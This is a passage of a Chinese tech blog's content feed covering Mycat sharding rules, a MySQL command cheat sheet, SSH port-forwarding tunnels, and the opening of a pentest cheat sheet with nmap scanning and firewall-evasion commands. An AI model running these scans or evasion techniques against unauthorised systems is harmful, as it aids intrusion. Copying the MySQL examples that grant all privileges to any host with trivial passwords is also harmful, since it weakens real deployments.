class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-stringhash"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--标识将要分片的表字段--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--分片函数--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-stringhash<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-substring"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionDirectBySubString"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--字符串hash求模基数--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">length</span>&gt;</span>512<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- zero-based --&gt;</span></div><div class="line">    <span class="comment">&lt;!--分区数--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--预算位--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hashSlice"</span>&gt;</span>0:2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>hashSlice ： 0 means str.length(), -1 means str.length()-1</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt; &quot;2&quot; -&amp;gt; (0,2)&lt;br/&gt;</div><div class="line">&gt; &quot;1:2&quot; -&amp;gt; (1,2)&lt;br/&gt;</div><div class="line">&gt; &quot;1:&quot; -&amp;gt; (1,0)&lt;br/&gt;</div><div class="line">&gt; &quot;-1:&quot; -&amp;gt; (-1,0)&lt;br/&gt;</div><div class="line">&gt; &quot;:-1&quot; -&amp;gt; (0,-1)&lt;br/&gt;</div><div class="line">&gt; &quot;:&quot; -&amp;gt; (0,0)&lt;br/&gt;</div></pre></div></div></figure><p>例子：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></div><div class="code"><pre><div class="line">String idVal=null;</div><div class="line"> rule.setPartitionLength(&quot;512&quot;);</div><div class="line"> rule.setPartitionCount(&quot;2&quot;);</div><div class="line"> rule.init();</div><div class="line"> rule.setHashSlice(&quot;0:2&quot;);</div><div class="line">//idVal = &quot;0&quot;;</div><div class="line">//Assert.assertEquals(true, 0 == rule.calculate(idVal));</div><div class="line">//idVal = &quot;45a&quot;;</div><div class="line">//Assert.assertEquals(true, 1 == rule.calculate(idVal));</div><div class="line"></div><div class="line"> </div><div class="line"> </div><div class="line">//last 4</div><div class="line">rule = new PartitionByString();</div><div class="line">rule.setPartitionLength(&quot;512&quot;);</div><div class="line">rule.setPartitionCount(&quot;2&quot;);</div><div class="line">rule.init();</div><div class="line">//last 4 characters</div><div class="line">rule.setHashSlice(&quot;-4:0&quot;);</div><div class="line">idVal = &quot;aaaabbb0000&quot;;</div><div class="line">Assert.assertEquals(true, 0 == rule.calculate(idVal));</div><div class="line">idVal = &quot;aaaabbb2359&quot;;</div><div class="line">Assert.assertEquals(true, 0 == rule.calculate(idVal));</div></pre></div></div></figure><h2 id="10-一致性hash"><a href="#10-一致性hash" class="headerlink" title="10. 一致性hash"></a>10. 一致性hash</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-murmur"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>murmur<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"murmur"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByMurmurHash"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"seed"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="comment">&lt;!-- 默认是0--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="comment">&lt;!-- 要分片的数据库节点数量，必须指定，否则没法分片--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"virtualBucketTimes"</span>&gt;</span>160<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="comment">&lt;!-- 一个实际的数据库节点被映射为这么多虚拟节点，默认是160倍，也就是虚拟节点数是物理节点数的160倍--&gt;</span></div><div class="line">      <span class="comment">&lt;!--</span></div><div class="line"><span class="comment">      &lt;property name="weightMapFile"&gt;weightMapFile&lt;/property&gt;</span></div><div class="line"><span class="comment">                     节点的权重，没有指定权重的节点默认是1。以properties文件的格式填写，以从0开始到count-1的整数值也就是节点索引为key，以节点权重值为值。所有权重值必须是正整数，否则以1代替 --&gt;</span></div><div class="line">      <span class="comment">&lt;!--</span></div><div class="line"><span class="comment">      &lt;property name="bucketMapPath"&gt;/etc/mycat/bucketMapPath&lt;/property&gt;</span></div><div class="line"><span class="comment">                      用于测试时观察各物理节点与虚拟节点的分布情况，如果指定了这个属性，会把虚拟节点的murmur hash值与物理节点的映射按行输出到这个文件，没有默认值，如果不指定，就不会输出任何东西 --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>一致性hash预算有效解决了分布式数据的扩容问题，前1-9中id规则都多少存在数据扩容难题，而10规则解决了数据扩容难点</p>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Mycat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mycat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常用Mysql语句</title>
      <link href="/2017/03/14/mysql-sql/"/>
      <url>/2017/03/14/mysql-sql/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>纪录运维过程常用的sql語句，备忘 创建数据库 CREATE DATABASE test CHARACTER SET UTF8; 字符集为UTF8</p></blockquote><a id="more"></a><h2 id="0x01-用戶密码及登陆相关"><a href="#0x01-用戶密码及登陆相关" class="headerlink" title="0x01 用戶密码及登陆相关"></a>0x01 用戶密码及登陆相关</h2><h3 id="1-更改密码"><a href="#1-更改密码" class="headerlink" title="1. 更改密码"></a>1. 更改密码</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'root'</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div></pre></div></div></figure><h3 id="2-允许远程登录"><a href="#2-允许远程登录" class="headerlink" title="2. 允许远程登录"></a>2. 允许远程登录</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'username'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div></pre></div></div></figure><h3 id="3-更改Mysql监听地址"><a href="#3-更改Mysql监听地址" class="headerlink" title="3. 更改Mysql监听地址"></a>3. 更改Mysql监听地址</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">vim /etc/my.cnf</div><div class="line">#在[mysqld]中添加</div><div class="line">bind-address=127.0.0.1</div></pre></div></div></figure><h3 id="4-创建用户"><a href="#4-创建用户" class="headerlink" title="4. 创建用户"></a>4. 创建用户</h3><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.tables <span class="keyword">to</span> <span class="string">'username'</span>@<span class="string">'127.0.0.1'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div><div class="line"># all privileges ---- 所有权限(可指定SELECT,DROP,UPDATE,INSTER....)</div></pre></div></div></figure><h3 id="5-查询所有用戶基本信息"><a href="#5-查询所有用戶基本信息" class="headerlink" title="5. 查询所有用戶基本信息"></a>5. 查询所有用戶基本信息</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>,host,<span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user;??</div></pre></div></div></figure><div class="note warning"><p>初始安裝数据库使用mysqladmin设置密码后，直接使用mysql -uroot -ppasswd 登陆正常，<br>使用mysql -uroot -ppasswd -h127.0.0.1<br>报错:<br>Access denied for user ‘root‘@’hostname’<br>设置允许远程登陆,仍然报错<br>这时使用SELECT user,host,password FROM mysql.user;语句进行查询<br>+——–+—————-+——————————————-+<br>| root   | localhost      | <em>3E8000C2FA234A170531B9063518B3B479E7C47B |<br>| root   | 127.0.0.1      | </em>2E9879C2FA764A1705567896B518B3B47324EA23 |<br>+——–+—————-+——————————————-+<br>更改為相同即可</p></div><h2 id="0x02-数据增刪改查"><a href="#0x02-数据增刪改查" class="headerlink" title="0x02 数据增刪改查"></a>0x02 数据增刪改查</h2><h3 id="1-批量刪除匹配的表"><a href="#1-批量刪除匹配的表" class="headerlink" title="1. 批量刪除匹配的表"></a>1. 批量刪除匹配的表</h3><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line">例：</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| userregin2017_03_01         |</div><div class="line">| userregin2017_03_02         |</div><div class="line">| userregin2017_03_03         |</div><div class="line">| userregin2017_03_04         |</div><div class="line">| userregin2017_03_05         |</div><div class="line">| userregin2017_03_06         |</div><div class="line">| userregin2017_03_07         |</div><div class="line">| userregin2017_03_08         |</div><div class="line">| userregin2017_03_09         |</div><div class="line">| userregin2017_03_10         |</div><div class="line">| userregin2017_03_11         |</div><div class="line">| userregin2017_03_12         |</div><div class="line">| userregin2017_03_13         |</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line"><span class="keyword">Select</span> <span class="keyword">CONCAT</span>( <span class="string">'drop table '</span>, table_name, <span class="string">';'</span> ) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">Where</span> table_name <span class="keyword">LIKE</span> <span class="string">'userregin%'</span>;</div><div class="line"># 导出的数据使用vim编辑Ctrl+v(选取) &gt;&gt; Shift+i &gt;&gt; 编辑 &gt;&gt; Esc &gt;&gt; 方向键下</div></pre></div></div></figure><h3 id="2-查询数据库大小"><a href="#2-查询数据库大小" class="headerlink" title="2. 查询数据库大小"></a>2. 查询数据库大小</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>((<span class="keyword">SUM</span>(DATA_LENGTH)+<span class="keyword">SUM</span>(INDEX_LENGTH))/<span class="number">1024</span>/<span class="number">1024</span>,<span class="string">'MB'</span>) <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'your_database'</span>;</div></pre></div></div></figure><h3 id="3-查询表大小"><a href="#3-查询表大小" class="headerlink" title="3. 查询表大小"></a>3. 查询表大小</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>((<span class="keyword">SUM</span>(DATA_LENGTH)+<span class="keyword">SUM</span>(INDEX_LENGTH))/<span class="number">1024</span>/<span class="number">1024</span>,<span class="string">'MB'</span>) <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'your_database'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'your_table'</span>;</div></pre></div></div></figure><h3 id="4-查询表结构"><a href="#4-查询表结构" class="headerlink" title="4. 查询表结构"></a>4. 查询表结构</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">desc your_table；</div></pre></div></div></figure><h3 id="5-查询建表语句"><a href="#5-查询建表语句" class="headerlink" title="5. 查询建表语句"></a>5. 查询建表语句</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> table_name;</div></pre></div></div></figure><h3 id="6-刪除"><a href="#6-刪除" class="headerlink" title="6. 刪除"></a>6. 刪除</h3><p>清空表数据：</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span>；</div><div class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</div><div class="line">#带规则清除</div></pre></div></div></figure><h3 id="7-查询表中NAME字段有哪些类型"><a href="#7-查询表中NAME字段有哪些类型" class="headerlink" title="7. 查询表中NAME字段有哪些类型"></a>7. 查询表中NAME字段有哪些类型</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">NAME</span> <span class="keyword">from</span> t_user <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">NAME</span>;</div></pre></div></div></figure><h2 id="0x03-备份还原"><a href="#0x03-备份还原" class="headerlink" title="0x03 备份还原"></a>0x03 备份还原</h2><p>压缩备份：</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">mysqldump -B -uroot -proot Your_database| gzip &gt; Your_database.sql.gz</div></pre></div></div></figure><p>压缩还原：</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">gunzip &lt; Your_database.sql.gz | mysql -uroot -proot</div></pre></div></div></figure><p>sql文件还原：</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -proot</div><div class="line"><span class="keyword">use</span> Your_database;</div><div class="line">source /root/Your_database.sql;</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSH端口转发</title>
      <link href="/2017/01/09/linux-ssh/"/>
      <url>/2017/01/09/linux-ssh/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>通过本文的介绍，读者可以从中了解到如何应用 SSH 端口转发机制来解决日常工作 / 生活中的一些问题。学会在非安全环境下使用端口转发来加密网络应用，保护个人隐私以及重要商业信息。同时也能够用此技术解决工作中一些常见问题，例如解决防火墙及网络应用本身带来的一些限制。</p></blockquote><a id="more"></a><h2 id="0x01-端口转发概述"><a href="#0x01-端口转发概述" class="headerlink" title="0x01 端口转发概述"></a>0x01 端口转发概述</h2><p>SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做隧道（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。</p><p>例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。</p><p>总的来说 SSH 端口转发能够提供两大功能：</p><div class="note success"><ol><li>加密 SSH Client 端至 SSH Server 端之间的通讯数据。</li><li>突破防火墙的限制完成一些之前无法建立的 TCP 连接。</li></ol></div><h2 id="0x02-本地转发"><a href="#0x02-本地转发" class="headerlink" title="0x02 本地转发"></a>0x02 本地转发</h2><p><img src="https://kionf.com/article_images/network.png" alt="本地转发"></p><p>如图,我们对B机器没有操作权限，C机器欲访问B机器，但由于B机器无外网ip，所以无法访问，但A机器可以和B，C两台机器通信（有外网ip和内网ip），此时使用SSH在A机器上做SSH端口本地转发，来实现外网访问内网B机器</p><div class="note danger"><p>如果转发后监听的ip地址为0.0.0.0，则需要更改跳板机的sshd配置文件<code>vim /etc/ssh/sshd_config</code>更改<code>GatewayPorts no</code> &gt; <code>GatewayPorts yes</code></p></div><p>在A机器执行：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3</div><div class="line">     |     |       |     |              |</div><div class="line">     A     B       C     D              E</div></pre></div></div></figure><p>这里我们来分段讲解命令的构成：</p><blockquote><p>A： 这里是本机转发后要监听的ip段，0.0.0.0允许所有ip访问，本机ip允许内网ip访问，127.0.0.1允许本机访问<br>B：远程主机端口转发到本机后的端口<br>C：要转发的远程主机ip，这里的ip地址是相对跳板机而言的<br>D：要转发的端口<br>E：需要执行转发的机器，即跳板机</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">-C压缩传输数据</div><div class="line">-f建立SSH连接后放置后台，静默模式</div><div class="line">-N不要执行远程命令。 这对于仅转发端口很有用（仅限协议版本2）</div><div class="line">-g允许远程主机连接本地端口转发</div><div class="line">-L指定本地（客户端）主机上的给定端口要转发到远程端的给定主机和端口。这通过分配一个套接字侦听本地端口，</div><div class="line">可选绑定到指定的bind_address工作。每当与此端口建立连接时，都会通过安全通道转发连接，</div><div class="line">并从远程机器连接到主机端口主机端口            # 记住本地转发时候用L选项就可以了</div></pre></div></div></figure><p>访问流程如下：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Client(C)    访问TCP&gt;    A:80    通过SSH隧道&gt;    SSH(A)    TCP&gt;    B:80</div></pre></div></div></figure><blockquote><p>这里做的是在A主机本地的端口转发，如果想把B机器80端口转发到在C机器的80端口</p></blockquote><p>在C机器执行：</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3</span></div><div class="line">ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@123.56.1.23</div><div class="line">只需要把此ip，更换成A机器外网ip即可</div><div class="line"><span class="comment">#ssh登陆A主机，告诉A主机，转发B主机（172.16.1.2）80端口，本机SSH与A主机建立SSH隧道转发到本机80端口</span></div><div class="line"><span class="comment">#此时在A主机执行netstat -anp|grep ssh会多出来一条SSH隧道进程，这个隧道就是与C主机建立的</span></div></pre></div></div></figure><p>访问流程如下：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Client(C)    TCP&gt;    C:80    通过SSH隧道&gt;    SSH(A)    TCP&gt;    B:80</div></pre></div></div></figure><div class="note danger"><p>建议亲手操作去试试找下感觉！</p></div><h2 id="0x03-远程转发"><a href="#0x03-远程转发" class="headerlink" title="0x03 远程转发"></a>0x03 远程转发</h2><p><img src="https://kionf.com/article_images/network2.png" alt="远程转发"></p><p>如图，同样我们对C机器没有操作权限，D机器想访问C机器80端口，但是和C同一网段的机器都没有外网ip，只有A机器有外网但和C又不是一个局域网，上节我们用的本地端口转发在这里就不能使用了，此时远程端口转发出来了: )</p><p>在B机器执行：</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">需要转发主机的ip(C)</div><div class="line">        |</div><div class="line">ssh -CNfgR 0.0.0.0:80:172.16.1.2:80 root@123.56.2.3</div><div class="line">    |      |              |            |</div><div class="line">远程主机监听网段 远程主机监听端口   转发端口     远程主机(A)</div></pre></div></div></figure><p>执行如上操作，此时D访问A主机80端口就可以转发到C主机80端口<code>B主机扮演跳板机角色</code></p><p>访问流程如下：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">Client(D)    TCP&gt;    A:80    SSH隧道&gt;    B    TCP&gt;    C:80</div><div class="line">#有种卖队友的感觉：）</div></pre></div></div></figure><h2 id="0x04-动态端口转发"><a href="#0x04-动态端口转发" class="headerlink" title="0x04 动态端口转发"></a>0x04 动态端口转发</h2><p>此方法多用于翻墙，所有端口经过SSH隧道，建立socks连接，一条命令自己体会</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">ssh  -qTfnN -D 7070 servername@serverIP  -p sshport</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foward </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透工具实战应用命令合集</title>
      <link href="/2016/12/30/kali-tools/"/>
      <url>/2016/12/30/kali-tools/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>本文为国外大牛总结自己在渗透测试中常用的一些小技巧。原文分为两部分，这里翻译并且总结，方便查阅。</p></blockquote><a id="more"></a><h2 id="NMAP-扫描策略"><a href="#NMAP-扫描策略" class="headerlink" title="NMAP 扫描策略"></a>NMAP 扫描策略</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></div><div class="code"><pre><div class="line"># 适用所有大小网络最好的 nmap 扫描策略</div><div class="line"></div><div class="line"># 主机发现，生成存活主机列表</div><div class="line">$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</div><div class="line">$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt</div><div class="line"></div><div class="line"># 端口发现，发现大部分常用端口</div><div class="line"># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</div><div class="line">$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</div><div class="line">$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</div><div class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢</div><div class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</div><div class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 显示 TCP\UDP 端口</div><div class="line">$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;</div><div class="line">$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;</div><div class="line"></div><div class="line"># 侦测服务版本</div><div class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 扫做系统扫描</div><div class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 系统和服务检测</div><div class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</div></pre></div></div></figure><h2 id="Nmap-–-躲避防火墙"><a href="#Nmap-–-躲避防火墙" class="headerlink" title="Nmap – 躲避防火墙"></a>Nmap – 躲避防火墙</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></div><div class="code"><pre><div class="line"># 分段</div><div class="line">$ nmap -f</div><div class="line"></div><div class="line"># 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</div><div class="line">$ nmap --mtu 24</div><div class="line"></div><div class="line"># 生成随机数量的欺骗</div><div class="line">$ nmap -D RND:10 [target]</div><div class="line"></div><div class="line"># 手动指定欺骗使用的 IP</div><div class="line">$ nmap -D decoy1,decoy2,decoy3 etc.</div><div class="line"></div><div class="line"># 僵尸网络扫描, 首先需要找到僵尸网络的IP</div><div class="line">$ nmap -sI [Zombie IP] [Target IP]</div><div class="line"></div><div class="line"># 指定源端口号</div><div class="line">$ nmap --source-port 80 IP</div><div class="line"></div><div class="line"># 在每个扫描数据包后追加随机数量的数据</div><div class="line">$ nmap --data-length 25 IP</div><div class="line"></div><div class="line"># MAC 地址欺骗，可以生成不同主机的 MAC 地址</div><div class="line">$ nmap --spoof-mac Dell/Apple/3Com IP</div></pre></div></div></figure><h2 id="Nmap-进行-Web-漏洞扫描"><a href="#Nmap-进行-Web-漏洞扫描" class="headerlink" title="Nmap 进行 Web 漏洞扫描"></a>Nmap 进行 Web 漏洞扫描</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div 